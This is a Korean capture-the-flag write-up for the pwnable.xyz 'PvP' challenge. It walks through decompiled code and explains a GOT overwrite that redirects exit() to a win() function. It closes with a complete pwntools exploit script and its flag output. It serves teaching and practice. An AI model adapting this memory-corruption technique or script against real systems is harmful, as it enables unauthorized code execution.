# [pwnable.xyz] PvP

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> iape v2
>
> Release: [PvP.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8999266/PvP.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176135707-bad3f533-a92a-4d38-b964-8f659fd80c49.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `setup()`

```c
void setup()
{
  unsigned int v0; // eax

  setvbuf(&_bss_start, 0LL, 2, 0LL);
  setvbuf(&IO_2_1_stdin_, 0LL, 2, 0LL);
  signal(14, handler);
  alarm(0x3Cu);
  v0 = time(0LL);
  srand(v0);
}
```

`time(0)`으로 가져온 현재 시각을 `srand()`의 인자로 전달하여 랜덤 시드를 설정한다.

### `main()`

#### 1. Short Append

```c
      case 1u:
        if ( messageExist )
          short_append();
        else
          puts("Message is empty.");
        break;
```

`messageExist`가 0이 아니면 `short_append()`를 호출한다.

#### `short_append()`

```c
unsigned __int64 short_append()
{
  int randomLen; // [rsp+Ch] [rbp-34h]
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  randomLen = rand() % 0x20;
  printf("Give me %d chars: ", (unsigned int)randomLen);
  memset(s, 0, 0x20uLL);
  read(0, s, randomLen);
  strncat(x, s, randomLen);
  return __readfsqword(0x28u) ^ v3;
}
```

`0x20`바이트 미만의 랜덤한 길이만큼 문자열을 입력받고 `x`에 이어붙인다.

#### 2. Long Append

```c
      case 2u:
        if ( messageExist )
        {
          puts("Message already there.");
        }
        else
        {
          long_append();
          messageExist = 1;
        }
        break;
```

`messageExist`가 0이면 `long_append()`를 호출하고 `messageExist`를 1로 설정한다.

#### `long_append()`

```c
char *long_append()
{
  int randomLen; // [rsp+4h] [rbp-Ch]
  void *buf; // [rsp+8h] [rbp-8h]

  randomLen = rand() & 0x3FF;
  printf("Give me %d chars: ", (unsigned int)randomLen);
  buf = calloc(randomLen, 1uLL);
  read(0, buf, randomLen);
  return strncat(x, (const char *)buf, randomLen);
}
```

`0x400`바이트 미만의 랜덤한 길이만큼 문자열을 입력받고 `x`에 넣는다.

#### 3. Print it

```c
      case 3u:
        if ( message )
          printf("Your msg %s\n", message);
        break;
```

저장된 `message`가 존재하면 `message`의 내용을 `"%s"`로 출력한다.

#### 4 Save

```c
      case 4u:
        save_it();
        break;
```

#### `save_it()`

```c
int save_it()
{
  size_t len; // rax
  unsigned int n; // [rsp+Ch] [rbp-4h]

  if ( !message )
  {
    len = strlen(x);
    message = (char *)malloc(len);
  }
  printf("How many bytes is your message? ");
  n = read_int32();
  if ( n <= 0x400 )
    return (unsigned int)strncpy(message, x, n);
  else
    return puts("Invalid");
}
```

저장된 `message`가 존재하지 않으면 `x`의 길이만큼 메모리를 할당해서 그 주소를 `message`에 넣는다. 그리고 `x`의 내용을 `message`로 최대 `0x400`바이트만큼 복사한다.

## Exploit

`message`로 `x`의 내용을 복사할 때 복사되는 문자열의 길이를 정할 수 있는 것을 이용하여,

![image](https://user-images.githubusercontent.com/104156058/176145537-b732b56b-7736-4ffe-a278-657b05f6479a.png)

`message`에는 `exit()`의 GOT 주소(`0x6020a0`)를 넣고,

![image](https://user-images.githubusercontent.com/104156058/176145690-34b6cc81-86b4-4109-be0d-21216891f6d4.png)

`x`에는 `win()`의 주소(`0x400b2d`)를 넣은 후, `save_it()`에서 3바이트만큼만 복사하면, `exit()`은 한 번도 호출되지 않은 상태이기 때문에, `exit()`의 GOT에 `win()`의 주소가 들어가게 된다.

서버에 접속한 후 60초가 지나면 `handler()` 내부에서 `exit()`이 호출되어 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30022)

sla = r.sendlineafter
sa = r.sendafter

win = 0x400b2d
exit_got = 0x6020a0

msg = p64(win)[:3].ljust(0x400, b'A')
msg += p64(exit_got)[:3]
curLen = 0

def short_append():
    sla('> ', '1')

    r.recvuntil('Give me ')
    randomLen = int(r.recvuntil(' ')[:-1])

    global curLen
    global msg
    if curLen + randomLen > len(msg):
        sa('chars: ', msg[curLen:])
        curLen = len(msg)
    else:
        sa('chars: ', msg[curLen:curLen + randomLen])
        curLen += randomLen
    
def long_append():
    sla('> ', '2')

    r.recvuntil('Give me ')
    randomLen = int(r.recvuntil(' ')[:-1])

    global curLen
    global msg
    if curLen + randomLen > len(msg):
        sa('chars: ', msg[curLen:])
        curLen = len(msg)
    else:
        sa('chars: ', msg[curLen:curLen + randomLen])
        curLen += randomLen

def save(messageLen):
    sla('> ', '4')
    sla('How many bytes is your message? ', str(messageLen))


# exit@GOT -> win()

long_append()

while curLen < len(msg):
    short_append()

save(3)

# wait 60 seconds


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30022: Done
[*] Switching to interactive mode
Menu:
 1. Short Append
 2. Long Append
 3. Print it
 4. Save
 0. Exit.
> FLAG{strcat_or_strncat_all_the_same}
```